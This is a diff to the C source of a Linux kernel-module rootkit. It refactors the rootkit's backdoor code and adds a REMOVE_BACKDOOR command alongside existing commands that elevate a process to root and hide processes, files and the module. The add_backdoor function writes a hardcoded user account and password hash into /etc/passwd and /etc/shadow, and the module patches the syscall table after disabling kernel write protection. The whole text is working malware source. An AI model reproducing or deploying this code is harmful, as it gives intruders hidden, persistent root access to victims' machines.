@@ -61,14 +61,15 @@ u_int8_t backdoor_added = 0;
 
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
-#define ELEVATE_UID  -23121990
-#define HIDE_PROCESS -19091992
-#define HIDE_MODULE  -657623
-#define SHOW_MODULE  -9032847
-#define SHOW_PROCESS -2051967
-#define HIDE_FILES   -7111963
-#define SHOW_FILES   -294365563
-#define ADD_BACKDOOR -31337
+#define ELEVATE_UID     -23121990
+#define HIDE_PROCESS    -19091992
+#define HIDE_MODULE     -657623
+#define SHOW_MODULE     -9032847
+#define SHOW_PROCESS    -2051967
+#define HIDE_FILES      -7111963
+#define SHOW_FILES      -294365563
+#define ADD_BACKDOOR    -31337
+#define REMOVE_BACKDOOR -841841
 /***************************************************************************/
 
 /* To store a pointer to original syscalls */
@@ -80,7 +81,7 @@ asmlinkage int (*original_getdents)(unsigned int fd,
 asmlinkage long (*original_open)(const char __user *pathname,
                                  int flags,
                                  mode_t mode);
-//<<<<<< asmlinkage long (*original_read)();
+int deletes_file(struct file*);
 
 /* Modify the CR0 register to block writes on syscall table */
 static void disable_write_protection(void)
@@ -115,6 +116,7 @@ static void enable_write_protection(void)
 int add_backdoor(void)
 {
     int ret = 0;
+    unsigned short int copyfailed = 0;
     char buf[100];
     char* passwd_str = "muzer:x:1000:1000:mu zer,,,:/etc:/bin/bash\n";
     char* shadow_str = "muzer:$6$izMzVORI$eZvXKcMhvorVcrmQtxPEjFPlkwNHWzniroz5BsY1xTpiypfnzk4NyLYs9NO.GhHY7zqNfCMVgTogeJ4xHsRF3/:17132:0:99999:7:::\n";
@@ -124,7 +126,6 @@ int add_backdoor(void)
     struct file* sfile = NULL;
     struct file* npfile = NULL;
     struct file* nsfile = NULL;
-    struct inode* rmfile_parent = NULL;
 
     // Open /etc/passwd in read mode
     pfile = filp_open(passwdfile, O_RDONLY, 0);
@@ -139,17 +140,15 @@ int add_backdoor(void)
     if (!IS_ERR(npfile)) {
         // muzerpasswd file already exists. Lets delete that
         // and then create our own
-        PUBMSG("A muzerpasswd file already exists");
-        PUBMSG("Deleting muzerpasswd and creating again...");
-        rmfile_parent = ((npfile->f_path).dentry)->d_parent->d_inode;
-        ret = vfs_unlink(rmfile_parent, (npfile->f_path).dentry, NULL);
+        PUBMSG("A muzerpasswd file already exists. Deleting to continue...");
+        ret = deletes_file(npfile);
         if (ret < 0) {
             PUBMSG("Failed to remove original muzerpasswd");
             goto closefiles_exit;
         }
     }
 
-    // Create a file called /etc/muzerpasswd and add backdoor to it
+    // Create a file called /etc/muzerpasswd and add the backdoor to it
     npfile = filp_open("/etc/muzerpasswd",
                        O_CREAT | O_RDWR | O_EXCL | O_TRUNC,
                        S_IRUSR | S_IWUSR);
@@ -163,21 +162,24 @@ int add_backdoor(void)
 
     // Copy the rest of /etc/passwd to muzerpasswd
     ret = 0;
-    while (ret >= 0) {
+    do {
         ret = kernel_read(pfile, pfile->f_pos, buf, 100);
         if (ret < 0) {
             PUBMSG("Failed to kern read pfile");
+            copyfailed = 1;
             break;
         }
-        printk("===== kernel_read returns %d", ret); //<<<<<<
         pfile->f_pos += ret;
         ret = kernel_write(npfile, buf, ret, npfile->f_pos);
         if (ret < 0) {
             PUBMSG("Failed to kern write to muzerpasswd");
+            copyfailed = 1;
         }
         npfile->f_pos += ret;
+    } while (ret > 0);
+    if (copyfailed) {
+        return ret;
     }
-    // How to figure out if the whole file has been copied or has there been an error?
 
     // Rename /etc/passwd to /etc/passwd_old and muzerpasswd to /etc/passwd
 
@@ -200,6 +202,21 @@ if (nsfile)
     filp_close(nsfile, NULL);
 
 out:
+    return ret;
+}
+
+int deletes_file(struct file* filp)
+{
+    int ret = 0;
+    struct inode* rmfile_parent = NULL;
+    if (filp == NULL) {
+        return 0;
+    }
+    rmfile_parent = ((filp->f_path).dentry)->d_parent->d_inode;
+    ret = vfs_unlink(rmfile_parent, (filp->f_path).dentry, NULL);
+    if (ret < 0) {
+        printk(KERN_ERR "deletes_file() failed. vfs_unlink returned %d\n", ret);
+    }
     return ret;
 }
 
@@ -487,7 +504,7 @@ asmlinkage int my_close(int fd)
             add_backdoor();
             break;
         default:
-            printk(KERN_EMERG "Wrong rootkit command: %d", fd);
+            printk(KERN_EMERG "Wrong rootkit command: %d\n", fd);
         }
     }
     else {
@@ -551,7 +568,7 @@ int rootkit_init(void)
     }
 
     //<<<<<< Do we need this?
-    printk(KERN_ERR "Syscall table at %p", syscall_table);
+    printk(KERN_ERR "Syscall table at %p\n", syscall_table);
 
     // Disable write protection on page
     disable_write_protection();
